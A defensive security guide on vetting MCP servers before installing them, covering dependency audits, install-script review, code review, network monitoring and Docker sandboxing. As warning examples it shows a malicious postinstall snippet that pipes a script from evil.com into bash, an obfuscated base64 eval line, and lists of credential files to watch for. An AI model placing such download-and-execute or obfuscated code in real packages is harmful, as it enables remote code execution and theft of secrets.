# MCP Server Security Guide
**Evaluating Model Context Protocol Servers Before Installation**

MCP servers are powerful but carry higher risk than skills. Here's how to evaluate them safely.

---

## Overview

**Time Required**: 1 hour per MCP server (more complex than skills)
**Difficulty**: Medium (some technical knowledge helpful)
**Output**: GO / NO-GO / SANDBOX decision
**Prerequisites**: Understanding of what MCP servers are, npm basics (optional but helpful)

---

## Why MCP Servers Are Higher Risk

**Compared to Claude Code skills**, MCP servers are riskier because they:

🔴 **Run as background services** (always active, not just when invoked)
- Skill: Runs only when you use it → Limited window for malicious activity
- MCP: Runs continuously → Can act at any time

🔴 **Require npm install** (which executes install scripts automatically)
- `postinstall` scripts run code during installation
- Malicious code can execute before you even use the MCP server

🔴 **Complex dependency trees** (each dependency is an attack vector)
- Average MCP server: 10-50 npm dependencies
- Each dependency can have malicious code
- Supply chain attack surface is large

🔴 **Network access by design** (many MCP servers need to make API calls)
- Harder to distinguish malicious vs. legitimate network activity
- Can exfiltrate data continuously

**Real incident**: In 2018, npm package "event-stream" (2M downloads/week) was compromised. New maintainer added cryptocurrency-stealing code. Ran for months before detection.

---

## The 8-Step MCP Server Vetting Process

---

### Step 1: Source & Reputation Check (10 minutes)

**Question**: Where did this MCP server come from?

#### Trusted Sources (Recommended)

✅ **Anthropic Official Examples**
- URL: github.com/anthropics/mcp-examples
- Risk: Very Low
- Action: Still review, but high trust

✅ **npm Verified Publishers** (>10k weekly downloads)
- Check: `npm info [package-name]`
- Look for: Weekly downloads >10,000, verified badge
- Risk: Low-Medium
- Action: Continue vetting

⚠️ **GitHub from Known Organizations**
- Examples: Microsoft, Google, AWS official repos
- Risk: Medium
- Action: Full vetting required

#### Untrusted Sources (High Risk)

⚠️ **npm Unverified** (<10k downloads)
- Risk: Medium-High
- Action: Very thorough vetting + consider sandboxing

❌ **Random GitHub repo** (individual, <500 stars)
- Risk: High
- Action: Sandbox required, expert review

❌ **Direct file share or private npm registry**
- Risk: Extreme
- Action: **Do not install**

#### Checks

**For npm packages**:
```bash
# Get package info
npm info [package-name]

# Look for:
- Weekly downloads: >10,000 is safer
- Last publish: Within 6 months
- Maintainers: Known individuals/organizations
- Homepage: Links to legitimate GitHub repo
```

**For GitHub repos**:
- [ ] Organization account (not individual)
- [ ] >500 stars
- [ ] Multiple contributors
- [ ] Recent commits (<3 months ago)
- [ ] Active issue responses

**Checklist**:
- [ ] Source identified and documented
- [ ] Source is from trusted or at least known category
- [ ] NOT from private/unknown source

**Decision**:
- ✅ Pass → Continue
- ❌ Fail → **REJECT** or require expert + sandbox

---

### Step 2: Dependency Audit (15 minutes)

**Question**: What dependencies does this MCP server rely on?

**Why it matters**: Each dependency is a potential attack vector.

#### How to Audit Dependencies

**Method 1: Check package.json (before installing)**
```bash
# If from GitHub, view package.json directly on GitHub
# Look in browser at: github.com/user/repo/blob/main/package.json

# Or if you've cloned repo:
cat package.json
```

**Look for**:
```json
{
  "dependencies": {
    "express": "^4.18.0",        // OK: Popular, well-known
    "axios": "^1.6.0",           // OK: Popular HTTP client
    "weird-helper-lib": "^1.0.0" // ⚠️ WARNING: Unknown package
  }
}
```

**Method 2: npm audit (after installing in test environment)**
```bash
# In a TEST directory (not production)
npm install [package-name]
npm audit

# Look for HIGH or CRITICAL vulnerabilities
```

#### Red Flags

❌ **>20 dependencies** (complex, large attack surface)
❌ **Unknown/obscure packages** in dependencies
❌ **Packages with few downloads** (<1,000/week for a dependency)
❌ **`npm audit` shows HIGH/CRITICAL vulnerabilities**
❌ **Dependencies from private npm registries**

#### Green Flags

✅ **<10 dependencies** (simpler, easier to audit)
✅ **All dependencies are well-known** (express, axios, lodash, etc.)
✅ **`npm audit` shows 0 vulnerabilities** (or only LOW)
✅ **Dependencies are actively maintained** (recent updates)

**Checklist**:
- [ ] Dependency count is reasonable (<20)
- [ ] All dependencies are from official npm registry
- [ ] No HIGH/CRITICAL vulnerabilities in `npm audit`
- [ ] Dependencies are well-known or can be individually vetted

**Decision**:
- ✅ Pass → Continue
- ⚠️ Uncertain → Escalate to expert
- ❌ Fail → **REJECT** or require sandboxing

---

### Step 3: Install Scripts Review (10 minutes)

**Question**: Does package.json have dangerous install scripts?

**Why it matters**: `postinstall`, `preinstall`, and `install` scripts run automatically during `npm install`. Malicious code can execute here.

#### How to Check

**Look at package.json `scripts` section**:
```json
{
  "scripts": {
    "start": "node index.js",     // ✅ OK: Normal startup
    "test": "jest",                // ✅ OK: Normal testing

    // ⚠️ WARNING: These run during install
    "postinstall": "node setup.js",
    "preinstall": "bash init.sh",
    "install": "curl http://..."   // ❌ RED FLAG
  }
}
```

#### Red Flags

❌ **Any network calls in install scripts** (`curl`, `wget`, `fetch`)
❌ **Binary downloads** during install
❌ **Execution of shell scripts** you haven't reviewed
❌ **File modifications** outside the package directory
❌ **Accessing environment variables** (`process.env.AWS_SECRET_KEY`)

#### Acceptable Install Scripts

✅ **Compiling native modules** (`node-gyp rebuild`)
✅ **Generating config files** (from templates)
✅ **Creating directories** (`mkdir -p ./data`)

**What to do**:
1. Read the install scripts (e.g., `setup.js`, `init.sh`)
2. Verify they only do what's documented
3. Check for network calls or file access

**Example of safe postinstall**:
```javascript
// setup.js
const fs = require('fs');

// Create config directory if it doesn't exist
if (!fs.existsSync('./config')) {
  fs.mkdirSync('./config');
}

console.log('Setup complete!');
```

**Example of malicious postinstall**:
```javascript
// setup.js
const { exec } = require('child_process');

// RED FLAG: Download and execute remote code
exec('curl http://evil.com/backdoor.sh | bash', (err) => {
  console.log('Setup complete!'); // Looks innocent in logs
});
```

**Checklist**:
- [ ] No install scripts, OR
- [ ] Install scripts reviewed and safe
- [ ] No network calls in install scripts
- [ ] No file access outside package directory

**Decision**:
- ✅ Pass → Continue
- ❌ Fail → **REJECT** or sandbox + expert review

---

### Step 4: Code Review (20 minutes)

**Question**: What does the actual MCP server code do?

**Note**: This step requires some technical knowledge. If you're non-technical, escalate to a developer for review.

#### What to Review

**Main entry point** (usually `index.js` or `src/index.js`):
```javascript
// Example MCP server entry point

// ✅ GOOD: Imports from known libraries
const express = require('express');
const { MCPServer } = require('@anthropic/mcp-sdk');

// ⚠️ WARNING: What is this?
const obscureLib = require('weird-package');

// ❌ RED FLAG: Obfuscated code
eval(Buffer.from('...base64...').toString());
```

#### Red Flags in Code

❌ **Obfuscation**: `eval()`, `Function()`, base64 encoded strings
❌ **Unusual file access**: Reading `.env`, `.aws/credentials`, `.ssh/`
❌ **Unexpected network calls**: Calls to non-documented APIs
❌ **Dynamic code execution**: `exec()`, `spawn()` with user input
❌ **Accessing secrets**: `process.env.API_KEY` without clear need

#### Green Flags

✅ **Clear, readable code**
✅ **Well-commented** (explains what code does)
✅ **Matches documentation** (does what README says)
✅ **Standard MCP patterns** (uses @anthropic/mcp-sdk properly)

**Checklist**:
- [ ] Code is readable (not obfuscated)
- [ ] File access is limited to documented functionality
- [ ] Network calls go to documented APIs only
- [ ] No dynamic code execution (eval, exec)

**Decision**:
- ✅ Pass → Continue
- ⚠️ Uncertain → Escalate to expert
- ❌ Fail → **REJECT**

---

### Step 5: Permissions & Capabilities Check (5 minutes)

**Question**: What can this MCP server access?

#### MCP Server Permissions

MCP servers are configured in `~/.claude.json` or Claude Code settings. Check what the server requests:

```json
{
  "mcpServers": {
    "example-server": {
      "command": "node",
      "args": ["/path/to/server/index.js"],
      "env": {
        "API_KEY": "your-api-key" // ⚠️ Providing API key to server
      }
    }
  }
}
```

#### Red Flags

❌ **Requests API keys** it shouldn't need
❌ **Environment variables with sensitive data** (`AWS_SECRET_KEY`, `STRIPE_KEY`)
❌ **File system access beyond current directory**
❌ **Network access** without clear justification

#### Principle of Least Privilege

**Question to ask**: "Why does this MCP server need [permission]?"

**Examples**:
- Weather API MCP server → Needs your API key for weather service ✅
- Local file search MCP server → Does NOT need API keys ❌

**Checklist**:
- [ ] Documented what permissions/access is needed
- [ ] Permissions match functionality (no excessive access)
- [ ] API keys only provided if absolutely necessary
- [ ] File access limited to specific directories (not full system)

**Decision**:
- ✅ Pass → Continue
- ❌ Fail → **REJECT** or sandbox with limited permissions

---

### Step 6: Network Activity Monitoring (10 minutes)

**Question**: Where does this MCP server connect?

**Note**: This requires running the server in a test environment first.

#### How to Monitor

**Method 1: Little Snitch / LuLu (macOS)**
```
1. Install Little Snitch (paid) or LuLu (free)
2. Start MCP server in test environment
3. Monitor all outbound connections
4. Verify connections match documentation
```

**Method 2: Wireshark (all platforms)**
```
1. Install Wireshark
2. Start packet capture
3. Run MCP server
4. Filter by server process
5. Review all HTTP/HTTPS connections
```

**Method 3: Manual curl check (simple)**
```bash
# Search code for network calls
grep -r "fetch\|axios\|http\|curl" /path/to/mcp-server/

# Review each URL found
# Verify URLs are documented and legitimate
```

#### Red Flags

❌ **Connections to unknown domains**
❌ **Connections to IP addresses** (not domains)
❌ **Non-HTTPS connections** (http:// not https://)
❌ **Data upload to undocumented endpoints**
❌ **Connections on unusual ports** (not 80/443)

#### Green Flags

✅ **Only connects to documented APIs**
✅ **All connections are HTTPS**
✅ **Connections to well-known services** (OpenAI, Anthropic, AWS, etc.)

**Checklist**:
- [ ] All network destinations documented in README
- [ ] Connections only to legitimate services
- [ ] HTTPS used for all connections
- [ ] No unexpected data uploads

**Decision**:
- ✅ Pass → Continue
- ⚠️ Uncertain → Escalate
- ❌ Fail → **REJECT** or sandbox with network restrictions

---

### Step 7: Sandbox Testing (10 minutes)

**Question**: Can we run this safely in isolation?

**Recommendation**: For all non-Anthropic MCP servers, use Docker sandboxing.

#### Why Sandbox?

Even "safe" MCP servers can:
- Have undiscovered vulnerabilities
- Be compromised in future updates
- Accidentally leak data

Sandboxing limits blast radius.

#### How to Sandbox with Docker

**Create Dockerfile**:
```dockerfile
FROM node:18-alpine

# Create app directory
WORKDIR /app

# Copy package files
COPY package*.json ./

# Install dependencies
RUN npm install --production

# Copy server code
COPY . .

# Run as non-root user
USER node

# Start server
CMD ["node", "index.js"]
```

**Run sandboxed**:
```bash
# Build container
docker build -t mcp-server-name .

# Run with limited permissions
docker run \
  --rm \
  --network=none \           # No network access (or limited)
  --read-only \              # Read-only filesystem
  -v $(pwd)/data:/app/data \ # Only mount specific directories
  mcp-server-name
```

#### Sandbox Levels

**Level 1: Network Isolation** (no internet)
- For MCP servers that don't need external APIs
- Prevents data exfiltration

**Level 2: Filesystem Isolation** (read-only + specific mounts)
- Prevent file modification
- Limit access to specific directories

**Level 3: Full Container Isolation** (Docker)
- Separate process space
- Resource limits
- Easy to destroy and rebuild

**Checklist**:
- [ ] MCP server runs successfully in Docker
- [ ] Limited to only necessary network access
- [ ] Limited to only necessary file access
- [ ] Can be destroyed and rebuilt easily

**Decision**:
- ✅ Sandboxed successfully → Approve with sandboxing
- ❌ Cannot sandbox → REJECT or use only in dev environment

---

### Step 8: Update & Maintenance Plan (5 minutes)

**Question**: How will we keep this MCP server secure over time?

#### Update Strategy

**npm packages**:
- [ ] Pin to specific version in package.json (`"package": "1.2.3"` not `"^1.2.3"`)
- [ ] Review changelog before updating
- [ ] Re-run full vetting process for major version updates
- [ ] Set calendar reminder for quarterly dependency audits

**GitHub repos**:
- [ ] Fork the repo (maintain your own copy)
- [ ] Review changes before pulling updates
- [ ] Pin to specific commit hash in production

**Monitoring**:
- [ ] Subscribe to security advisories (GitHub watch, npm security alerts)
- [ ] Monitor server logs for unusual activity
- [ ] Set up alerts for unexpected network traffic

**Checklist**:
- [ ] Version pinning strategy documented
- [ ] Update review process defined
- [ ] Monitoring in place
- [ ] Calendar reminders set for quarterly reviews

**Decision**:
- ✅ Maintenance plan in place → Approve
- ❌ No plan → Create plan before approval

---

## Final Decision Matrix

| Category | Status | Recommendation |
|----------|--------|----------------|
| **All checks pass + Anthropic official** | ✅✅✅ | **APPROVE** - Install normally |
| **All checks pass + well-known org** | ✅✅ | **APPROVE** - Install with monitoring |
| **All checks pass + individual author** | ✅ | **APPROVE** - Sandbox + monitor closely |
| **1-2 checks fail (non-critical)** | ⚠️ | **SANDBOX** - Use Docker isolation |
| **3+ checks fail or critical failure** | ❌ | **REJECT** - Do not install |
| **Uncertain about any check** | ⚠️ | **ESCALATE** - Get expert review |

---

## Docker Sandbox Template

**Full production-ready Docker setup**:

```dockerfile
# Dockerfile
FROM node:18-alpine

# Security: Run as non-root
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001

WORKDIR /app

# Install dependencies first (better caching)
COPY --chown=nodejs:nodejs package*.json ./
RUN npm ci --only=production

# Copy application code
COPY --chown=nodejs:nodejs . .

# Switch to non-root user
USER nodejs

# Expose only necessary ports
EXPOSE 3000

# Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD node -e "require('http').get('http://localhost:3000/health', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"

CMD ["node", "index.js"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  mcp-server:
    build: .
    restart: unless-stopped
    networks:
      - mcp-network
    volumes:
      - ./data:/app/data:rw  # Only specific directory
      - ./config:/app/config:ro  # Config read-only
    environment:
      - NODE_ENV=production
      # Add only necessary env vars (not all system env)
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE  # Only if needed
    read_only: true
    tmpfs:
      - /tmp

networks:
  mcp-network:
    driver: bridge
```

**Run**:
```bash
docker-compose up -d
```

---

## Examples: Real Vetting Decisions

### Example 1: Anthropic Official MCP Server

**Source**: github.com/anthropics/mcp-examples
**npm downloads**: N/A (from source)
**Dependencies**: 5 (all official)
**Install scripts**: None
**Code review**: Clean, well-documented
**Network**: Only to Anthropic API
**Sandbox**: Not required (first-party)

**Decision**: ✅ **APPROVE** - Install normally

---

### Example 2: Popular Database MCP Server

**Source**: npm (50k weekly downloads)
**Dependencies**: 12 (all well-known)
**Install scripts**: `postinstall`: Compile native module (safe)
**Code review**: Readable, matches docs
**Network**: Only to configured database
**Sandbox**: Recommended but not required

**Decision**: ✅ **APPROVE** - Install with monitoring

---

### Example 3: Individual Developer's MCP Server

**Source**: GitHub (200 stars)
**Dependencies**: 8 (unknown helper library flagged)
**Install scripts**: `postinstall`: Creates config file (safe)
**Code review**: Good, but helper library unclear
**Network**: Calls undocumented API endpoint
**Sandbox**: Required

**Decision**: ⚠️ **APPROVE WITH SANDBOX** - Docker isolation mandatory

---

### Example 4: Suspicious "Productivity" MCP Server

**Source**: npm (500 weekly downloads)
**Dependencies**: 25 (several obscure packages)
**Install scripts**: `postinstall`: Downloads binary (RED FLAG)
**Code review**: Obfuscated sections found
**Network**: Connects to IP address (not domain)
**Sandbox**: Cannot determine safety

**Decision**: ❌ **REJECT** - Too many red flags

---

## Ongoing Monitoring

**After installation, monitor**:

**Weekly**:
- [ ] Check MCP server logs for errors/warnings
- [ ] Review network activity (unusual connections?)

**Monthly**:
- [ ] Check for available updates (npm outdated)
- [ ] Review npm audit results
- [ ] Check GitHub repo for security issues

**Quarterly**:
- [ ] Full re-vetting (re-run Steps 1-8)
- [ ] Update dependencies (after review)
- [ ] Rebuild Docker container with fresh base image

---

## 🔗 Related Resources

**Before using this guide**:
- [TOOLS.md](../TOOLS.md) - Trusted MCP server sources
- [THREATS.md](../THREATS.md) - Supply chain attack risks

**After installation**:
- [Data Protection](06-data-protection.md) - Limit what MCP can access
- [Incident Response](08-incident-response.md) - If something goes wrong

**Other tool types**:
- [Skill Vetting](02-skill-vetting.md) - For Claude Code skills
- [Browser Extensions](04-browser-extensions.md) - For extensions

---

**Last Updated**: February 2026

---

**Remember**: MCP servers run continuously and have deep system access. The extra vetting time (1 hour vs. 15 min for skills) is worth it. When in doubt, sandbox.
